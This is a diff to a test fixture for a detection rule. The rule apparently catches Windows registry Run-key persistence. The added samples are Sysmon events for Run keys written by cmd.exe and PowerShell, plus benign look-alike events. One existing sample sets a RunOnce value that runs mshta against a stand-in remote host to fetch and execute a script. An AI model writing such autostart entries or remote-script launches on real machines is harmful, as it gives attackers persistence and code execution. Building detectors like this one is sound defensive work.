@@ -17,6 +17,18 @@ positive:
       Image: 'C:\Windows\System32\mshta.exe'
       TargetObject: 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\Init'
       Details: 'mshta.exe http://example.invalid/a.hta'
+  - description: 32-bit Run key under WOW6432Node, written by cmd.exe
+    event:
+      EventID: 13
+      Image: 'C:\Windows\System32\cmd.exe'
+      TargetObject: 'HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\Helper'
+      Details: 'C:\ProgramData\helper.exe'
+  - description: Policies\Explorer\Run, written by PowerShell
+    event:
+      EventID: 13
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      TargetObject: 'HKU\S-1-5-21-1111111111-2222222222-3333333333-1105\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\Sync'
+      Details: 'C:\Users\Public\sync.exe'
 negative:
   - description: OneDrive registering its own autostart
     event:
@@ -30,3 +42,15 @@ negative:
       Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
       TargetObject: 'HKU\S-1-5-21-1111111111-2222222222-3333333333-1105\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt'
       Details: 'DWORD (0x00000000)'
+  - description: Win+R history (Explorer\RunMRU) written by cmd.exe is not persistence
+    event:
+      EventID: 13
+      Image: 'C:\Windows\System32\cmd.exe'
+      TargetObject: 'HKU\S-1-5-21-1111111111-2222222222-3333333333-1105\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a'
+      Details: 'notepad\1'
+  - description: Uninstall entry with "Runtime" in its name, written by PowerShell
+    event:
+      EventID: 13
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      TargetObject: 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{0A1B}\DisplayName'
+      Details: 'Java Runtime Environment'
